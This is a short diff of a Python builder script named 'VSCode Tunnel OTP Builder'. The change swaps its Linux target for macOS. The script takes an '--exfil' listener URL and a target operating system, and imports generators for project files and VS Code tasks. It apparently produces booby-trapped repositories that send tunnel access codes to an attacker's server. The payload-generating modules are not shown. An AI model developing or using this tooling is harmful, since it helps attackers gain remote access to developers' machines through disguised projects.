@@ -10,8 +10,8 @@ from modules import express_generator, package_generator, readme_generator, git_
 
 def get_tasks_generator(os_type):
     """Dynamically import the correct tasks generator based on OS."""
-    if os_type == 'linux':
-        from modules import tasks_generator_linux as tasks_generator
+    if os_type == 'macos':
+        from modules import tasks_generator_macos as tasks_generator
     else:
         from modules import tasks_generator as tasks_generator
     return tasks_generator
@@ -57,7 +57,7 @@ def main():
     parser = argparse.ArgumentParser(description='VSCode Tunnel OTP Builder')
     parser.add_argument('--project', help='Project/repo name')
     parser.add_argument('--exfil', help='Listener URL (e.g., http://your-server:8080)')
-    parser.add_argument('--os', choices=['windows', 'linux'], default='windows',
+    parser.add_argument('--os', choices=['windows', 'macos'], default='windows',
                         help='Target operating system (default: windows)')
     parser.add_argument('--output', help='Output directory')
     args = parser.parse_args()
